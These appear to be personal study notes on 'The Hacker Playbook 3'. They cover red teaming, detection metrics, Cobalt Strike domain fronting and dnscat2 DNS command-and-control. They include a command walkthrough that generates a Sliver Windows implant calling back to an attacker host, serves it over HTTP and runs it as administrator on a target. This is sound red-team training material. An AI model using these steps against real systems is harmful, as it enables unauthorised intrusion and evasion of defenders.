# Hacker PlayBook 3

## Penetration Testing Vs Red team
- Penetration Testing is the more rigorous and methodical testing of a network, application,hardware, etc
- Companies still need penetration testers to be a part of their secure software development life cycle (S-SDLC)
- Red teams are those who come up with same ideas and tatics as real attackers come.
- The Red Team’s mission is to emulate the tactics, techniques, and procedures (TTPs) by adversaries. 
- The goals are to give real world and hard facts on how a company will respond, find gaps within a security program, identify skill gaps within employees, and ultimately increase their security posture
- it is not as methodical as penetration tests

**We almost never run a vulnerability scan against the internal network because  are very loud on the network and will most likely get caught in today’s world**

 ![Screenshot](/images/redteamvspentest.png)

 - Two strong metrics that evolve from these campaigns are 
    1. Time To Detect (TTD) and 
    2. Time To Mitigate (TTM)

## What does Time To Detect mean?
- It is the time between the initial occurrence of the incident to when an analyst detects and starts working on the incident

## What does Time to Mitigate mean?
- It is the secondary metric to record. This timeline is recorded when the firewall block, DNS sinkhole, or network isolation is implemented.
- The other valuable information to record is how the Security Teams work with IT, how management handles a critical incident, and if employees panic

**With all this data, we can build real numbers on how much your company is at risk, or how likely it is to be compromised**

- As Red Teamers, our job is to test if the overall security program is working


#### Assumed breach exercise
- Since Red Team campaigns focus on detection/mitigation instead of vulnerabilities, we can do some more unique assessments.
- One assessment that provides customers/clients with immense benefit is called an assumed breach exercise where there will always be 0-days assumption. 


#### PenTesters Framework
- go to following path
    ```
    cd /opt/ptf
    ```
- Run
    ```
    ./ptf
    ```
- then
    ```
    help
    ```
- then
    ```
    show modules
    ```
- All tools are installed under pentest
    ```
    cd /pentest
    ```

## Cobalt Strike
- It is a tool for post exploitation, lateral movement, staying hidden in the network, and exfiltration
- To take your redirectors up a notch, we utilize Domain Fronting. 
- Domain Fronting is a collection of techniques to make use of other people’s domains and infrastructures as redirectors for your controller
- This can be accomplished by utilizing popular Content Delivery Networks (CDNs) such as Amazon’s CloudFront or other Google Hosts to mask traffic origins

## Powershell empire
- In place of this empire , i have used sliver 
- To Execute sliver
    - Open terminal 1 and type
        ```
        sliver
        ```
        ```
        update
        ```
        ```
        help
        ```
        ```
        generate --help
        ```
    - To create payload
        ```
        generate --os windows --arch 64bit --mtls kali_ip -s /opt/tmp
        ```
    - To change file name
        ```
        sudo mv file.ext newfile.exe
        ```
    -To checks available jobs
        ```
        jobs
        ```
    - To check sessions
        ```
        sessions
        ```

    
    - Now open Terminal 2 and execute
        ```
        python3 -m http.server 9000
        ```

    - Now go to target window and open browser and type
        ```
        kali_ip:9000
        ```
    - Now you will find the payload and download it and run as administrator in windows


## Dnscat2
- This tool is designed to create an encrypted Command and Control (C2) channel over the DNS protocol
- C2 and exfiltration over DNS provides a great mechanism to hide your traffic, evade network sensors, and get around network restrictions
- it does not require root privileges and allows both shell access and exfiltration
    ![Screenshot](/images/dnscat2.png)

- Instead of communicating over HTTP/HTTPS like modern C2 frameworks, it communicates through DNS queries and responses

page 32